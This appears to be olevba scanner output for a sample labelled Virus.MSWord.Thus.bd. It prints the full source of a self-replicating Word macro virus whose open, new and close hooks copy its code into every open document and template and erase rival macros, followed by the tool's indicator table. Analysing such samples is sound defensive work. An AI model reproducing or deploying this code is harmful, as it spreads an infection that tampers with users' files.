olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RMET
Private Sub checkup()
Dim t As Template, d As Document
Dim o As Object
    On Error Resume Next
    For Each o In Templates
        Set t = Templates(o)
        If moduleContainsKeyword(Templates(t), "etha" + "n") Then
            Templates(t).VBProject.VBComponents(1).codeModule.DeleteLines 1, Templates(t).VBProject.VBComponents(1).codeModule.CountOfLines
        End If
        ins t
    Next
    For Each o In Documents
        Set d = Documents(o)
        If moduleContainsKeyword(Documents(d), "etha" + "n") Then
            Documents(d).VBProject.VBComponents(1).codeModule.DeleteLines 1, Documents(d).VBProject.VBComponents(1).codeModule.CountOfLines
        End If
        ins d
    Next
End Sub

Private Function moduleContainsKeyword( _
td As Object, keyword As String) As Boolean
Dim i As Integer
    If td = ThisDocument Then
        Exit Function
    End If
    If TypeOf td Is Template Then
        For i = 1 To Templates(td).VBProject.VBComponents(1).codeModule.CountOfLines
            If InStr(1, Templates(td).VBProject.VBComponents(1).codeModule.Lines(i, 1), keyword) <> 0 Then
                moduleContainsKeyword = True
                Exit For
            End If
        Next i
    ElseIf TypeOf td Is Document Then
        For i = 1 To Documents(td).VBProject.VBComponents(1).codeModule.CountOfLines
            If InStr(1, Documents(td).VBProject.VBComponents(1).codeModule.Lines(i, 1), keyword) <> 0 Then
                moduleContainsKeyword = True
                Exit For
            End If
        Next
    End If
End Function

Private Sub Document_Close()
    checkup
End Sub

Private Sub Document_New()
    checkup
End Sub

Private Sub Document_Open()
    checkup
End Sub

Private Sub ins(td As Object)
Dim i As Integer
    On Error Resume Next
    If TypeOf td Is Template Then
        If Templates(td).VBProject.VBComponents(1).codeModule.Lines(1, 1) <> "'RMET" Then
            For i = 1 To ThisDocument.VBProject.VBComponents(1).codeModule.CountOfLines
                Templates(td).VBProject.VBComponents(1).codeModule.InsertLines i, _
                 ThisDocument.VBProject.VBComponents(1).codeModule.Lines(i, 1)
            Next
        End If
    ElseIf TypeOf td Is Document Then
        If Documents(td).VBProject.VBComponents(1).codeModule.Lines(1, 1) <> "'RMET" Then
            For i = 1 To ThisDocument.VBProject.VBComponents(1).codeModule.CountOfLines
                Documents(td).VBProject.VBComponents(1).codeModule.InsertLines i, _
                 ThisDocument.VBProject.VBComponents(1).codeModule.Lines(i, 1)
            Next
        End If
    End If
End Sub


























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

